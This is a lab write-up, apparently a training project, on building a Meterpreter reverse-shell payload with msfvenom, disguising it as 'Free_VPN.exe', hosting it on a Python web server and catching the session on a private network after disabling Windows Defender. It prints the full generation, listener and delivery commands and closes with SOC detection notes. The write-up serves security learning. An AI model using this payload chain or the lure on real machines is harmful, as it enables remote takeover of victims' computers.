# Phase 3 — Payload Creation and Delivery

## What I'm Trying to Do
This phase covers creating a malicious executable using msfvenom and 
delivering it to the Windows 10 victim machine. The goal is to simulate 
a real world malware infection and establish a reverse shell connection 
from the victim back to Kali giving me full remote control of the 
machine.

## Understanding the Attack Chain
In a real world attack this payload would never be delivered by having 
the victim type an IP address into a browser. A real attacker would:

- Send a phishing email with a malicious link
- Host the file on a convincing fake website
- Use social engineering to trick the victim into downloading and 
  running the file

In this lab I am simulating both the attacker and the victim. Browsing 
to the Kali web server from Windows 10 is me playing the role of a 
victim clicking a phishing link. The technical outcome is identical, 
the delivery method is just manual since there is no real victim.

## Why Free_VPN.exe?
The filename Free_VPN.exe was chosen deliberately as a social 
engineering lure. VPN software is something many people download 
without thinking twice, especially free ones. A victim receiving an 
email with a link to download a free VPN would very likely click it 
without suspecting anything malicious. This is exactly the kind of 
naming convention real threat actors use to disguise malware.

## Step 1 — Creating the Payload

### Command Used
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f exe -o Free_VPN.exe
```

### Breaking Down the Command
- msfvenom is Metasploit's payload generation tool
- p windows/x64/meterpreter_reverse_tcp is the payload type. Windows 
  64 bit meterpreter shell that connects back to us over TCP
- LHOST=192.168.1.17 is the Kali IP address hardcoded into the payload 
  so the victim machine knows where to call back to
- LPORT=4444 is the port on Kali that will be listening for the 
  incoming connection
- f exe outputs the payload as a Windows executable file
- o Free_VPN.exe is the output filename

### Result
```
Payload size: 232006 bytes
Final size of exe file: 239104 bytes
Saved as: Free_VPN.exe
```

Verified the file was created correctly:
```bash
ls -lh Free_VPN.exe
file Free_VPN.exe
```

Output confirmed it as an executable for MS Windows x86-64 
architecture which is exactly what we need to run on the 64 bit 
Windows 10 victim machine.

## Step 2 — Setting Up the Metasploit Listener

Before delivering the payload I set up a listener in Metasploit to 
catch the incoming connection when the victim runs the file.

### Commands Used
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.1.17
set LPORT 4444
exploit
```

The multi/handler module is a universal listener that sits and waits 
for incoming connections. It does not attack anything on its own, it 
just catches the reverse shell connection when the victim executes the 
payload. The payload and LHOST and LPORT settings must match exactly 
what was used in msfvenom otherwise the connection will fail.

Once exploit was run Metasploit confirmed:
```
Started reverse TCP handler on 192.168.1.17:4444
```

Kali was now listening and waiting.

## Step 3 — Hosting and Delivering the Payload

A simple Python web server was started on Kali to host the file:
```bash
python3 -m http.server 9999
```

This created a temporary web server serving all files in the current 
directory on port 9999. From Windows 10 I browsed to:
```
http://192.168.1.17:9999
```

The directory listing showed Free_VPN.exe available for download. 
Clicking it downloaded the file to the Windows 10 machine simulating 
a victim downloading malware from an attacker controlled server.

## Step 4 — Execution and Shell

After downloading Free_VPN.exe on Windows 10 I attempted to run it 
but Windows Defender immediately killed the process. The session opened 
briefly then closed. This is actually realistic behavior showing how 
antivirus catches known malware signatures.

To complete the simulation I disabled Windows Defender real time 
protection, cloud delivered protection and automatic sample submission 
on the Windows 10 VM. After disabling these protections I ran the 
payload again and Metasploit immediately caught the connection:
```
Meterpreter session 2 opened (192.168.1.17:4444 to 192.168.1.18:53967)
Meterpreter session 3 opened (192.168.1.17:4444 to 192.168.1.18:53970)
```

Two sessions opened because the payload was executed twice during 
testing. Both sessions were fully functional.

## Step 5 — Verifying Full Control

From the meterpreter shell I ran several commands to confirm full 
access to the victim machine:
```
sysinfo output:
Computer    : DESKTOP-2KU324L
OS          : Windows 10 22H2 (Build 19045)
Architecture: x64
Domain      : WORKGROUP
Logged Users: 2

getuid output:
Server username: DESKTOP-2KU324L\wsp vro
```

## Step 6 — Verifying From the Victim Side

On Windows 10 I opened an elevated Command Prompt ( baiscally cmd as an admin) and ran:
```cmd
netstat -anob
```

This confirmed the active reverse shell connections:
```
TCP  192.168.1.18:53967  192.168.1.17:4444  ESTABLISHED  [Free_VPN.exe]
TCP  192.168.1.18:53970  192.168.1.17:4444  ESTABLISHED  [Free_VPN.exe]
```

I belive This is exactly what a SOC analyst would find when investigating a 
compromised machine. The netstat output clearly shows an unknown 
executable called Free_VPN.exe making outbound connections to an 
external IP on a non standard port, which are all major red flags in 
a real investigation.

Free_VPN.exe was also visible running in Task Manager confirming the 
malware was actively running as a background process on the victim 
machine.

## Key Takeaways
In a real SOC environment the following would trigger alerts:

- An unknown executable making outbound connections on port 4444
- A process connecting to an IP address with no associated domain name
- Windows Defender being disabled shortly before a suspicious process 
  appeared
- A new executable appearing in the user downloads folder and 
  immediately making network connections

## Screenshots
 msfvenom output showing payload generated successfully
 
- `payload-verified.png` — ls and file commands confirming the 
  executable exists and is valid
- `metasploit-options.png` — Metasploit handler configured with 
  correct payload, LHOST and LPORT
- `webserver-running.png` — Python web server running on port 9999
- `metasploit-listener.png` — Metasploit listener running and waiting
- `webserver-browser.png` — Windows 10 browser showing directory 
  listing with Free_VPN.exe available
- `meterpreter-session.png` — Meterpreter sessions opening on Kali 
  confirming successful reverse shell
- `meterpreter-sysinfo.png` — sysinfo and getuid output proving full 
  access to victim machine
- `netstat-freevpn.png` — netstat output on Windows 10 showing 
  Free_VPN.exe established connections to Kali port 4444
- `taskmanager-freevpn.png` — Task Manager showing Free_VPN.exe 
  running as background process
